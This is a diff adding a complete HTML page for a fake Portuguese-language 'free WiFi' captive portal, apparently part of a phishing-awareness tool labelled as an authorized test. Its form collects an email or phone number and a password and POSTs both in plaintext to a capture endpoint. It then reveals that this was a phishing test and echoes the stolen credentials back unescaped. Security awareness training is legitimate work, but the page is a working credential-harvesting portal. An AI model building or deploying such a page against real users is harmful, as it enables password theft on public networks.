@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WiFi Gratuito — Entrar</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif}
+  body{background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;border-radius:14px;box-shadow:0 6px 30px rgba(0,0,0,.12);max-width:380px;width:100%;padding:32px;text-align:center}
+  .ico{font-size:46px;margin-bottom:8px}
+  h1{font-size:20px;color:#1a1a1a;margin-bottom:6px}
+  p{color:#666;font-size:13px;margin-bottom:20px}
+  input{width:100%;padding:13px;margin:7px 0;border:1px solid #ddd;border-radius:8px;font-size:15px}
+  button{width:100%;padding:13px;margin-top:12px;background:#1877f2;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
+  button:hover{background:#166fe5}
+  .terms{font-size:11px;color:#999;margin-top:14px;line-height:1.5}
+  .reveal{display:none}
+  .reveal.on{display:block}
+  .warn{font-size:50px}
+  .reveal h1{color:#c0392b}
+  .cap{background:#fff3f3;border:1px solid #ffd0d0;border-radius:8px;padding:12px;margin:14px 0;text-align:left;font-size:13px;color:#900;word-break:break-all}
+  .footer{position:fixed;bottom:8px;left:0;right:0;text-align:center;font-size:10px;color:#bbb}
+</style>
+</head>
+<body>
+  <div class="box" id="form">
+    <div class="ico">📶</div>
+    <h1>WiFi Gratuito</h1>
+    <p>Faça login com sua conta para acessar a internet gratuita.</p>
+    <form onsubmit="enviar(event)">
+      <input type="email" id="usuario" placeholder="E-mail ou telefone" required>
+      <input type="password" id="senha" placeholder="Senha" required>
+      <button type="submit">Conectar</button>
+    </form>
+    <div class="terms">Ao conectar você concorda com os termos de uso do hotspot.</div>
+  </div>
+
+  <div class="box reveal" id="reveal">
+    <div class="warn">⚠️</div>
+    <h1>Isto foi um teste de phishing</h1>
+    <p>Você acabou de inserir suas credenciais em um <b>ponto de acesso falso</b>. Num ataque real, esses dados seriam roubados agora.</p>
+    <div class="cap" id="capBox"></div>
+    <p style="font-size:12px">Nunca digite senhas em portais de WiFi público. Verifique sempre a rede e use VPN.</p>
+  </div>
+
+  <div class="footer">Teste de segurança autorizado · SinalRF</div>
+<script>
+async function enviar(e){
+  e.preventDefault();
+  const u=document.getElementById('usuario').value, s=document.getElementById('senha').value;
+  try{ await fetch('/api/wifi/captura',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({portal:'wifi',campos:{usuario:u,senha:s}})}); }catch{}
+  document.getElementById('capBox').innerHTML='Você enviou:<br>usuário: <b>'+u+'</b><br>senha: <b>'+s+'</b>';
+  document.getElementById('form').style.display='none';
+  document.getElementById('reveal').classList.add('on');
+}
+</script>
+</body>
+</html>
